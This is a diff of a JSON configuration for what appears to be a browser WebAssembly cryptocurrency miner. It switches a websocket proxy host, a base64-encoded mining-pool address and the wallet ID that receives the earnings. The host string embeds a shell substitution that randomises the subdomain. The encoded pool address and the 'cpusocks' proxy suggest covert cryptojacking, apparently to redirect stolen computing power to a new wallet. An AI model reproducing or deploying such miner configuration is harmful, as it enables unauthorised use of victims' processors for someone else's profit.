@@ -1,5 +1,5 @@
 {
-  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/ZXUtc3RyYXR1bS5ibG9ja21pbmVyei5jb206MzUwNQ==",
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/bWF6YXBvb2wud290Lm1yZmFjZS5jb206ODQ0Mg==",
   "config": { "threads": 6, "log": true },
-  "options": { "user": "MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93", "password": "x", "argent": "web-wasm/1.0" }
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "web-wasm/1.0" }
 }
